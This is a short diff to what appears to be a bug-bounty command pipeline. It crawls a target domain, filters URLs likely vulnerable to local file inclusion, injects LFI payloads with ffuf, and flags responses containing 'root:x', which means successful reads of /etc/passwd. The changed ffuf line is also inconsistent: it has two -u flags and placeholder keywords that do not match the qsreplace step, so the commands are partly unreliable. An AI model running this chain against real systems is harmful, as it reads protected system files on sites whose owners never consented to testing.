@@ -5,9 +5,9 @@ echo "example.com" | katana -o katana.txt
 
 cat katana.txt | sort -u | urldedupe > urls.txt
 
-cat urls.txt | gf lfi > lfi.txt
+cat urls.txt | gf lfi | qsreplace FUZZ > lfi.txt
 
-ffuf -u FUZZ -w lfi-urls.txt:FUZZ -w lfi-payloads.txt:PAYLOAD
+ffuf -u FUZZ -w lfi.txt:URL -w lfiPayloads.txt:PAYLOAD -u URL -mr "root:x"
 
 ```
 
